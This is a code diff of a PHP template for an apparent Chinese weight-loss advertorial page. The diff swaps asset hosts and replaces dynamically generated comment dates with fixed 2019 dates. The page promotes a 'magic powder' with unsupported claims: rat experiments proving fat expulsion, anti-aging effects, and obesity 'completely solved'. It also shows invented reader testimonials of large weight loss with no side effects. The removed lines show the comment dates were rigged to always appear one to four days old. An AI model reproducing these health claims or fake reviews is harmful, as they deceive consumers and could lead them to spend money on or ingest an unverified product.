-<script src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/js/modaleffects.js" tppabs="http://jjs1.depfm.top/demo/modal/js/modalEffects.js"></script>
+<script src="http://fk.gzls05.com/public/depfm/jjs1.depfm.top/demo/modal/js/classie.js" tppabs="http://jjs1.depfm.top/demo/modal/js/classie.js"></script>
+<script src="http://fk.gzls05.com/public/depfm/jjs1.depfm.top/demo/modal/js/modalEffects.js" tppabs="http://jjs1.depfm.top/demo/modal/js/modalEffects.js"></script>
 
-<script src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/js/main.js" tppabs="http://jjs1.depfm.top/template/mobile/js/main.js"></script>  
+<script src="http://fk.gzls05.com/public/depfm/jjs1.depfm.top/template/mobile/js/main.js" tppabs="http://jjs1.depfm.top/template/mobile/js/main.js"></script>  
 
 
  
@@ -668,7 +658,7 @@ function submit2(){
     <p class="pid" style="padding-bottom:0;padding-top:2px;font-weight:700; line-height:25px;margin:10px 0;">实验证明：神奇粉末能有效排出体内脂肪，以达到减重的目的。</p>
     <p class="pid" style="padding-bottom:0;padding-top:2px; line-height:25px;margin:10px 0;">两组实验鼠喂食同样分量同样食物，其中一组使用神奇粉末，对比观察30天体重的变化。</p>
     <div style="text-align:center;">
-    <img style="width:100%;" src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/o1cn01o05ng51el0poybcva_!!2684310334.jpg">
+    <img style="width:100%;" src="https://img.alicdn.com/imgextra/i4/2684310334/O1CN01O05NG51EL0poYbcVA_!!2684310334.jpg">
     </div>
     </div>
     -->
@@ -676,7 +666,7 @@ function submit2(){
     <p class="pid" style="padding-bottom:0;padding-top:2px;font-weight:700; line-height:25px;margin:10px 0;text-indent:2em;">实验证明：神奇粉末能有效排出体内脂肪，以达到减重的目的。</p>
     <p class="pid" style="padding-bottom:0;padding-top:2px; line-height:25px;margin:10px 0;text-indent:2em;">两组实验鼠喂食同样分量同样食物，其中一组使用神奇粉末，对比观察30天体重的变化。</p>
     <div style="text-align:center;">
-    <img style="width:100%;" src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/o1cn01o05ng51el0poybcva_!!2684310334.jpg">
+    <img style="width:100%;" src="https://img.alicdn.com/imgextra/i4/2684310334/O1CN01O05NG51EL0poYbcVA_!!2684310334.jpg">
     </div>
     
     
@@ -688,7 +678,7 @@ function submit2(){
         使用神奇粉末减肥成功后，能明显感觉到变年轻了，皮肤变好了。只需每天坚持使用，10斤，20斤，30斤，40斤，瘦身节奏，完全由自己把控！<p>
         <div style="height:10px;"></div>
         <div style="text-align:center;">
-            <img style="width:100%;" src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/o1cn01jrfxlq1el0prifjd0_!!2684310334.png">
+            <img style="width:100%;" src="https://img.alicdn.com/imgextra/i2/2684310334/O1CN01jrfXLQ1EL0prIfjD0_!!2684310334.png">
         </div>
     </div>
     
@@ -699,7 +689,7 @@ function submit2(){
 <p class="pid " style="padding-bottom:5px;padding-top:5px; line-height:25px;margin:10px 0;  text-indent:2em;" ><span style="color:#ff0000;font-weight:700; ">第三</span>：<span style=" font-weight:700;">养颜抗衰</span>。皮肤变得更加细腻，皱纹变淡，面部提升，越喝越年轻。因此很多人喝该黄色粉末瘦下来以后，为了健康为了美，依然坚持喝</p>
 
 <div style="text-align:center;">
-            <img style="width:100%;" src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/o1cn01arkyhy1el0pnb1z5b_!!2684310334.jpg">
+            <img style="width:100%;" src="https://img.alicdn.com/imgextra/i1/2684310334/O1CN01arKyHy1EL0pnb1Z5b_!!2684310334.jpg">
         </div>
         
         <p class="pid" style="font-weight:700;color:#333;line-height:25px;margin:10px 0; text-indent:2em;">本文结语：科学家多年的研究，最终创造出这种神奇的瘦身粉末，2019年的今天终于可以宣告：减肥难题彻底攻破?</p>
@@ -745,37 +735,37 @@ function submit2(){
 
                 <li><span>5</span>
 
-                    <div class="xc"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/hw_00309b25.png" tppabs="http://yj6.jinanbuyun.com/picture/hw_00309b25.png" width="38" height="38"></div>
+                    <div class="xc"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/hw_00309b25.png" tppabs="http://yj6.jinanbuyun.com/picture/hw_00309b25.png" width="38" height="38"></div>
 
                     <b>好文</b></li>
 
                 <li><span>3</span>
 
-                    <div class="xc"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/qp_235ef6bf.png" tppabs="http://yj6.jinanbuyun.com/picture/qp_235ef6bf.png" width="38" height="38"></div>
+                    <div class="xc"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/qp_235ef6bf.png" tppabs="http://yj6.jinanbuyun.com/picture/qp_235ef6bf.png" width="38" height="38"></div>
 
                     <b>钦佩</b></li>
 
                 <li><span>2</span>
 
-                    <div class="xc"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/dc_ff82dee0.png" tppabs="http://yj6.jinanbuyun.com/picture/dc_ff82dee0.png" width="38" height="38"></div>
+                    <div class="xc"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/dc_ff82dee0.png" tppabs="http://yj6.jinanbuyun.com/picture/dc_ff82dee0.png" width="38" height="38"></div>
 
                     <b>笑抽</b></li>
 
                 <li><span>2</span>
 
-                    <div class="xc"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/lb_e7323f83.png" tppabs="http://yj6.jinanbuyun.com/picture/lb_e7323f83.png" width="38" height="38"></div>
+                    <div class="xc"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/lb_e7323f83.png" tppabs="http://yj6.jinanbuyun.com/picture/lb_e7323f83.png" width="38" height="38"></div>
 
                     <b>泪奔</b></li>
 
                 <li><span>0</span>
 
-                    <div class="xc"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/wl_04f1989a.png" tppabs="http://yj6.jinanbuyun.com/picture/wl_04f1989a.png" width="38" height="38"></div>
+                    <div class="xc"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/wl_04f1989a.png" tppabs="http://yj6.jinanbuyun.com/picture/wl_04f1989a.png" width="38" height="38"></div>
 
                     <b>无聊</b></li>
 
                 <li><span>2</span>
 
-                    <div class="xc"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/qz_ac5416f9.png" tppabs="http://yj6.jinanbuyun.com/picture/qz_ac5416f9.png" width="38" height="38"></div>
+                    <div class="xc"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/qz_ac5416f9.png" tppabs="http://yj6.jinanbuyun.com/picture/qz_ac5416f9.png" width="38" height="38"></div>
 
                     <b>气炸</b></li>
 
@@ -806,19 +796,19 @@ function submit2(){
 
                     <div class="i-commentFaceBox js_faceBox">
 
-                        <div class="mod-comment-inputFaceBox clearfix"> <a href="javascript:;" class="w-face-trigger js_faceMore"> <img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_1.png" tppabs="http://yj6.jinanbuyun.com/picture/face_1.png" title="微笑" alt="微笑"> <span class="icon-faceTrigArr"></span> </a>
+                        <div class="mod-comment-inputFaceBox clearfix"> <a href="javascript:;" class="w-face-trigger js_faceMore"> <img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_1.png" tppabs="http://yj6.jinanbuyun.com/picture/face_1.png" title="微笑" alt="微笑"> <span class="icon-faceTrigArr"></span> </a>
 
                             <div class="mod-comment-nearlyFace">
 
                                 <ul class="mod-facesImg-list">
 
-                                    <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_2.png" tppabs="http://yj6.jinanbuyun.com/picture/face_2.png" title="大笑" alt="大笑"></li>
+                                    <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_2.png" tppabs="http://yj6.jinanbuyun.com/picture/face_2.png" title="大笑" alt="大笑"></li>
 
-                                    <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_4.png" tppabs="http://yj6.jinanbuyun.com/picture/face_4.png" title="可爱" alt="可爱"></li>
+                                    <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_4.png" tppabs="http://yj6.jinanbuyun.com/picture/face_4.png" title="可爱" alt="可爱"></li>
 
-                                    <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_15.png" tppabs="http://yj6.jinanbuyun.com/picture/face_15.png" title="冷汗" alt="冷汗"></li>
+                                    <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_15.png" tppabs="http://yj6.jinanbuyun.com/picture/face_15.png" title="冷汗" alt="冷汗"></li>
 
-                                    <li class="phoneNone"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_10.png" tppabs="http://yj6.jinanbuyun.com/picture/face_10.png" title="雷到了" alt="雷到了"></li>
+                                    <li class="phoneNone"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_10.png" tppabs="http://yj6.jinanbuyun.com/picture/face_10.png" title="雷到了" alt="雷到了"></li>
 
                                 </ul>
 
@@ -834,49 +824,49 @@ function submit2(){
 
                                         <ul class="mod-facesImg-list clearfix">
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_1.png" tppabs="http://yj6.jinanbuyun.com/picture/face_1.png" title="微笑" alt="微笑"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_1.png" tppabs="http://yj6.jinanbuyun.com/picture/face_1.png" title="微笑" alt="微笑"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_2.png" tppabs="http://yj6.jinanbuyun.com/picture/face_2.png" title="大笑" alt="大笑"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_2.png" tppabs="http://yj6.jinanbuyun.com/picture/face_2.png" title="大笑" alt="大笑"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_3.png" tppabs="http://yj6.jinanbuyun.com/picture/face_3.png" title="坏笑" alt="坏笑"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_3.png" tppabs="http://yj6.jinanbuyun.com/picture/face_3.png" title="坏笑" alt="坏笑"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_4.png" tppabs="http://yj6.jinanbuyun.com/picture/face_4.png" title="可爱" alt="可爱"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_4.png" tppabs="http://yj6.jinanbuyun.com/picture/face_4.png" title="可爱" alt="可爱"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_5.png" tppabs="http://yj6.jinanbuyun.com/picture/face_5.png" title="爱心" alt="爱心"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_5.png" tppabs="http://yj6.jinanbuyun.com/picture/face_5.png" title="爱心" alt="爱心"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_6.png" tppabs="http://yj6.jinanbuyun.com/picture/face_6.png" title="鬼脸" alt="鬼脸"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_6.png" tppabs="http://yj6.jinanbuyun.com/picture/face_6.png" title="鬼脸" alt="鬼脸"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_7.png" tppabs="http://yj6.jinanbuyun.com/picture/face_7.png" title="亲亲" alt="亲亲"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_7.png" tppabs="http://yj6.jinanbuyun.com/picture/face_7.png" title="亲亲" alt="亲亲"></li>
 
-                                            <li class="js_r3"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_8.png" tppabs="http://yj6.jinanbuyun.com/picture/face_8.png" title="思考" alt="思考"></li>
+                                            <li class="js_r3"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_8.png" tppabs="http://yj6.jinanbuyun.com/picture/face_8.png" title="思考" alt="思考"></li>
 
-                                            <li class="js_r3"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_9.png" tppabs="http://yj6.jinanbuyun.com/picture/face_9.png" title="发怒" alt="发怒"></li>
+                                            <li class="js_r3"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_9.png" tppabs="http://yj6.jinanbuyun.com/picture/face_9.png" title="发怒" alt="发怒"></li>
 
-                                            <li class="js_r3"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_10.png" tppabs="http://yj6.jinanbuyun.com/picture/face_10.png" title="雷到了" alt="雷到了"></li>
+                                            <li class="js_r3"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_10.png" tppabs="http://yj6.jinanbuyun.com/picture/face_10.png" title="雷到了" alt="雷到了"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_11.png" tppabs="http://yj6.jinanbuyun.com/picture/face_11.png" title="闭嘴" alt="闭嘴"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_11.png" tppabs="http://yj6.jinanbuyun.com/picture/face_11.png" title="闭嘴" alt="闭嘴"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_12.png" tppabs="http://yj6.jinanbuyun.com/picture/face_12.png" title="不高兴" alt="不高兴"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_12.png" tppabs="http://yj6.jinanbuyun.com/picture/face_12.png" title="不高兴" alt="不高兴"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_13.png" tppabs="http://yj6.jinanbuyun.com/picture/face_13.png" title="哭泣" alt="哭泣"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_13.png" tppabs="http://yj6.jinanbuyun.com/picture/face_13.png" title="哭泣" alt="哭泣"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_14.png" tppabs="http://yj6.jinanbuyun.com/picture/face_14.png" title="吃惊" alt="吃惊"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_14.png" tppabs="http://yj6.jinanbuyun.com/picture/face_14.png" title="吃惊" alt="吃惊"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_15.png" tppabs="http://yj6.jinanbuyun.com/picture/face_15.png" title="冷汗" alt="冷汗"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_15.png" tppabs="http://yj6.jinanbuyun.com/picture/face_15.png" title="冷汗" alt="冷汗"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_16.png" tppabs="http://yj6.jinanbuyun.com/picture/face_16.png" title="发呆" alt="发呆"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_16.png" tppabs="http://yj6.jinanbuyun.com/picture/face_16.png" title="发呆" alt="发呆"></li>
 
-                                            <li><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_17.png" tppabs="http://yj6.jinanbuyun.com/picture/face_17.png" title="咒骂" alt="咒骂"></li>
+                                            <li><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_17.png" tppabs="http://yj6.jinanbuyun.com/picture/face_17.png" title="咒骂" alt="咒骂"></li>
 
-                                            <li class="js_r3"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_18.png" tppabs="http://yj6.jinanbuyun.com/picture/face_18.png" title="尴尬" alt="尴尬"></li>
+                                            <li class="js_r3"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_18.png" tppabs="http://yj6.jinanbuyun.com/picture/face_18.png" title="尴尬" alt="尴尬"></li>
 
-                                            <li class="js_r3"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_19.png" tppabs="http://yj6.jinanbuyun.com/picture/face_19.png" title="呕吐" alt="呕吐"></li>
+                                            <li class="js_r3"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_19.png" tppabs="http://yj6.jinanbuyun.com/picture/face_19.png" title="呕吐" alt="呕吐"></li>
 
-                                            <li class="js_r3"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_20.png" tppabs="http://yj6.jinanbuyun.com/picture/face_20.png" title="拜拜" alt="拜拜"></li>
+                                            <li class="js_r3"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_20.png" tppabs="http://yj6.jinanbuyun.com/picture/face_20.png" title="拜拜" alt="拜拜"></li>
 
                                         </ul>
 
-                                        <div class="mod-facesImg-big js_bigFace" style="display: none;"> <img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/face_1.png" tppabs="http://yj6.jinanbuyun.com/picture/face_1.png" title="微笑" alt="微笑">
+                                        <div class="mod-facesImg-big js_bigFace" style="display: none;"> <img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/face_1.png" tppabs="http://yj6.jinanbuyun.com/picture/face_1.png" title="微笑" alt="微笑">
 
                                             <p>微笑</p>
 
@@ -918,7 +908,7 @@ function submit2(){
 
                     <p class="w-contentTxt">这个粉末我用过，效果是真的好，我瘦了30斤</p>
 
-                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="952831279"><span>推荐</span><em class="w-rep-num">42</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="952831279" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="952831279">举报</a> </span> <span class="w-commentTime"> <?php echo date("Y年m月d日 14:16",strtotime("-1 days"))?> </span> </div>
+                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="952831279"><span>推荐</span><em class="w-rep-num">42</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="952831279" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="952831279">举报</a> </span> <span class="w-commentTime"> <em>2019-</em>04-23 11:55 </span> </div>
 
                 </div>
 
@@ -934,7 +924,7 @@ function submit2(){
 
                     <p class="w-contentTxt">比之前试的郑多燕那些有效多了</p>
 
-                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="952679265"><span>推荐</span><em class="w-rep-num">100</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="952679265" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="952679265">举报</a> </span> <span class="w-commentTime"> <?php echo date("Y年m月d日 13:21",strtotime("-1 days"))?></span> </div>
+                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="952679265"><span>推荐</span><em class="w-rep-num">100</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="952679265" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="952679265">举报</a> </span> <span class="w-commentTime"> <em>2019-</em>04-07 08:51 </span> </div>
 
                 </div>
 
@@ -950,7 +940,7 @@ function submit2(){
 
                     <p class="w-contentTxt">太神奇了，我瘦了10多斤了，如果能让我收到95斤，我愿意做一辈子善事</p>
 
-                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="952679265"><span>推荐</span><em class="w-rep-num">2</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="952679265" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="952679265">举报</a> </span> <span class="w-commentTime"> <?php echo date("Y年m月d日 15:21",strtotime("-1 days"))?></span> </div>
+                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="952679265"><span>推荐</span><em class="w-rep-num">2</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="952679265" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="952679265">举报</a> </span> <span class="w-commentTime"> <em>2019-</em>03-20 06:01 </span> </div>
 
                 </div>
 
@@ -978,7 +968,7 @@ function submit2(){
 
                     <p class="w-contentTxt">之前就听过瘦身老师，挺出名的，给很多明星艺人都做过老师，成功帮我从140多斤减到现在的94斤，太开心了</p>
 
-                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">5</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 17:21",strtotime("-1 days"))?></span> </div>
+                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">5</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>04-17 7:42</span> </div>
 
                 </div>
    <div class=" padding20 text-left tcsize80"><b class=" reply ">作者回复</b><br>
@@ -999,7 +989,7 @@ function submit2(){
 
                     <p class="w-contentTxt">对比单纯食谱减肥，这个效果给力的多啊</p>
 
-                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">15</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 13:21",strtotime("-2 days"))?></span> </div>
+                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">15</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>03-16 7:55</span> </div>
 
                 </div>
 
@@ -1015,7 +1005,7 @@ function submit2(){
 
                     <p class="w-contentTxt">目前最好的最有效的减肥，没有之一</p>
 
-                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">7</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 14:23",strtotime("-2 days"))?></span> </div>
+                    <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">7</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>03-15 8:01</span> </div>
 
               </div>
 
@@ -1031,7 +1021,7 @@ function submit2(){
 
                                 <p class="w-contentTxt">简直是瘦身黑科技，像我这样的胖子们都有救了</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">5</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 9:34",strtotime("-2 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">5</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>04-04 9:20</span> </div>
 
                             </div>
 
@@ -1047,7 +1037,7 @@ function submit2(){
 
                                 <p class="w-contentTxt">这个粉末我用了，比运动减肥快速的多了</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">2</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 08:51",strtotime("-3 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">2</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>03-22 9:30</span> </div>
 
                             </div>
 
@@ -1063,7 +1053,7 @@ function submit2(){
 
                                 <p class="w-contentTxt">我正在用，目前1个月瘦20斤，比预期效果更好，皮肤也变好了</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">11</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 18:42",strtotime("-3 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">11</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>04-1111:22</span> </div>
 
                             </div>
 
@@ -1079,7 +1069,7 @@ function submit2(){
 
                                 <p class="w-contentTxt">没想到还有这么好的东西，不但减肥块，还健康没副作用</p>
 
-                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">13</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><?php echo date("Y年m月d日 19:37",strtotime("-4 days"))?></span> </div>
+                                <div class="w-bottomBar"> <span class="w-reply"> <a href="javascript:;" class="w-rep-rec js_recm" data-quoteid="953414182"><span>推荐</span><em class="w-rep-num">13</em></a> <em class="w-rep-line">/</em> <a href="javascript:;" class="w-rep-reply js_reply" data-quoteid="953414182" data-status="0" data-isbase="true">回复</a> <em class="w-rep-line">/</em> <a class="w-report js_report" href="javascript:;" data-commentid="953414182">举报</a> </span> <span class="w-commentTime"><em>2019-</em>03-19 14:30</span> </div>
 
                             </div>
 
@@ -1095,7 +1085,7 @@ function submit2(){
 
